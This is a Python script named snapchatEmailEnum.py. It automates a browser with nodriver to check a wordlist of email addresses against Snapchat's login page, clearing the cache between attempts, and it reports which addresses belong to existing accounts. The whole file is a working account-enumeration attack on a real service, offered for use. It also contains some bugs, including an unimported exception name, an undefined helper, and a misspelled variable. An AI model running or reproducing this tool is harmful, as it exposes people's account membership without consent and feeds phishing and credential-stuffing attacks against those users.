import nodriver as uc 
from nodriver import cdp
import asyncio
import os
import sys
import re
import argparse
import traceback
import inspect
from inspect import getfullargspec


VERBOSE=0
SENUMINF = "[SNAPENUM.INFO.OUT]"
SENUMERR = "[SNAPENUM.ERROR.OUT]"
SENUMWAR = "[SNAPENUM.WARNING.OUT]"
SENUMINP = "[SNAPENUM.INPUT.OUT]"
SENUMVERBINF = "[SNAPENUMVERB.INFO.OUT]"
SENUMVERBERR = "[SNAPENUMVERB.ERROR.OUT]"  
SENUMVERBWAR = "[SNAPENUMVERB.WARNING.OUT]"
SENUMVERBINP = "[SNAPENUMVERB.INPUT.OUT]"

def snapEnumOut(msg, type="inf"):
  msg = str(msg).strip()
  prefix = { 
    "info": SENUMINF, "inf": SENUMINF,
    "err": SENUMERR,
    "warn": SENUMWAR,
    "input": SENUMINP, "inp": SENUMINP,
  }
  print(f"{prefix.get(type)} {msg}")

def snapEnumOutVerb(msg, type="info"):
  if VERBOSE:
    if type == "info" or type == "inf":
      print(f"{SENUMVERBINF} {msg}")
    elif type == "err":
      print(f"{SENUMVERBERR} {msg}")
    elif type == "warn":
      print(f"{SENUMVERBWAR} {msg}")
    elif type == "input" or type == "inp":
      print(f"{SENUMVERBINP} {msg}")
    else:
      print(f"{SENUMVERBINF} {msg}")

USE_PYAUTOGUI=True
try:
  import pyautogui
except Exception as e:
  print(f"Failed to import pyautogui: {e}")
  USE_PYAUTOGUI=False

async def getMaxDisplayResolution():
  global USE_PYAUTOGUI
  screenW = None
  screenH = None
  if USE_PYAUTOGUI:
    screenW,screenH = pyautogui.size()
  if not screenW or not screenH:
    print("PyAutoGUI couldn't retrieve display resolution.")
    print("Enter screen width in pixels (example: 1920): ")
    screenW = str(input()).strip()
    print("Enter screen height in pixels (example: 1080): ")
    screenH = str(input()).strip()
  print(f"Screen resolution (w,h): {screenW},{screenH}px")

  return [screenW,screenH]

async def initBrowser(browserRes, customBrowserPath=None):

  if not customBrowserPath:
    defaultBrowserExecutablePath = "chrome-linux64-146.0.7680.165/chrome"
    defaultBrowserExecutablePathWindows = "chrome-win64-146.0.7680.165/chrome.exe"
    if os.name == 'nt':
      browserPath = defaultBrowserExecutablePathWindows
    else:
      browserPath = defaultBrowserExecutablePath
  else:
    browserPath = customBrowserPath

  nodriverCfg = uc.Config(user_data_dir="./temp_browser_user_data",
                                browser_executable_path = browserPath,
                                _browser_args = ["--window-position=0,0", f"--window-size={browserRes[0]},{browserRes[1]}"],
                                sandbox=True)

  return await uc.Browser.create(config=nodriverCfg)

'''
Executes a function until it completes whilst ignoring nodriver protocol
 exceptions
(including 'Could not find node with given id [code: -32000]')
'''
async def doIT(func, **kwargs):
  while True:
    try:
      funcArgNames = set(getfullargspec(func).args)
      argDict = {
        item: kwargs[item] for item in funcArgNames if item in kwargs
      }
      return await func(**argDict)
    except ProtocolException or StopIteration as e:
      bbp(f"ProtocolException inside doIT:", "err")
      traceback.print_exception(e, limit=None)


async def main():

  parser = argparse.ArgumentParser(prog='snapchatEmailEnum.py', 
                                   usage='%(prog)s [options]',
                                   description='''
                                   Enumerates emails that are tied with a snapchat account using
                                   the snapchat login page (doesn't work with usernames, only emails).
                                   ''',
                                   epilog='''
                                   Tested on/with: 
                                   Linux ParrotOS 6.19.6+parrot7-amd64 (Debian),
                                   Linux Arch 6.19.10 x64_86,
                                   Linux RHEL10 6.12.0-124.47.1 x64_86,
                                   Windows Version 10.0.17763 Build 17763 x64,
                                   Chromium 146.0.7680,
                                   Python 3.12.12-3.14.3,
                                   nodriver==0.48.1,
                                   see requirements.txt for more module info..
                                   ''')

  parser.add_argument('-w', '--wordlist', help='Path to a wordlist containing a new-line seperated list of emails.', required=True)
  parser.add_argument('-e', '--browser_exec_path', help='Custom path to browser executable')
  parser.add_argument('-t', '--timeout', type=int, help='timeout between enumeratation attempts')
  parser.add_argument('-v', '--verbose', help="True/False/1/0")

  args = parser.parse_args()

  global VERBOSE 
  if args.verbose: 
    if args.verbose == "True" or args.verbose == "1":
      snapEnumOutVerb("Verbose mode set")
      VERBOSE=1
    if args.verbose == "False" or args.verbose == "0":
      VERVBOSE=0

  # --wordlist/-w existence gets verified by parser due to required=True opt

  # Check if wordlist file exists/isn't empty
  if os.stat(args.wordlist).st_size == 0:
    snapEnumOut("Wordlist file doesn't exist or is empty, exiting...")
    sys.exit(1)

  if not args.timeout: args.timeout=4  # seconds

  if not args.browser_exec_path:
    args.browser_exec_path=None 

  snapEnumOutVerb(f"arguments: {args}")


  try:

    maxDisplayRes = await getMaxDisplayResolution()

    # Use the created browser on the next iterations
    browser = await initBrowser(maxDisplayRes, args.browser_exec_path)
  except Exception as e:
    snapEnumOut(f"An exception occured when starting the browser: {e}", "err")
    snapEnumOut("Retrying...")
    try:
      browser = await initBrowser(maxDisplayRes, args.browser_exec_path)
    except Exception as e:
      snapEnumOut(f"An exception occured when starting the browser for the 2nd time: {e}", "err")
      snapEnumOut("Exiting...")
      sys.exit(1)
  
  snapEnumOutVerb(f"browser -> {vars(browser)}")

  snapchatLoginUrl = "https://accounts.snapchat.com/v2/login"

  with open(args.wordlist) as file: 
    for line in file:
      try:

        line = str(line).strip()

        snapEnumOut(f"Current email: {line}")
        tab = await doIT(browser.get, url=snapchatLoginUrl)

        resultOfCacheClear = await doIT(tab.send, cdp_obj=cdp.network.clear_browser_cache())
        snapEnumOutVerb(f"resultOfCacheClear: {resultOfCacheClear}")
        snapEnumOutVerb("Cleared browser cache!")

        usernameOrEmailInputFieldArr = await doIT(tab.xpath, xpath='//*[@id="username"]', timeout=10)
        if len(usernameOrEmailInputFieldArr) == 0:
          raise Exception("user/email input field not found!")

        usernameOrEmailInputField = usernameOrEmailInputFieldArr[0]
        snapEnumOutVerb("Selected user/email input field!")

        await doIT(usernameOrEmailInputField.send_keys, text=line)
        snapEnumOutVerb(f"Wrote: {line}")

        nextButton = await doIT(tab.select, selector="button[class*=Login_next__2nEN0]")
        if not nextButton:
          raise Exception("Couldn't find next button!")

        snapEnumOutVerb("Selected next button!")

        await doIT(nextButton.click)
        snapEnumOutVerb("Clicked next button!")

        notYouText = await doIT(tab.select, selector="div[class*=Shared_accountIdentifier__WTV12]")
        if not notYouText:
          snapEnumOutVerb("This email doesn't seem to be linked to an account")
        else:
          if "Snapchat" in str(notYouText):
            snapEnumOutVerb("This email doesn't seem to be linked to an account")
          else:
            snapEnumOut(f"Email {line} exists!")

        await asyncio.sleep(args.timeout)

      except ProtocolException:
        pass	
      except Exception as e:
        snapEnumOut(f"Exception occured: {e}", "err")
        if VERBOSE:
          traceback.print_exception(e, limit=None)
 
  browser.stop

asyncio.run(main())

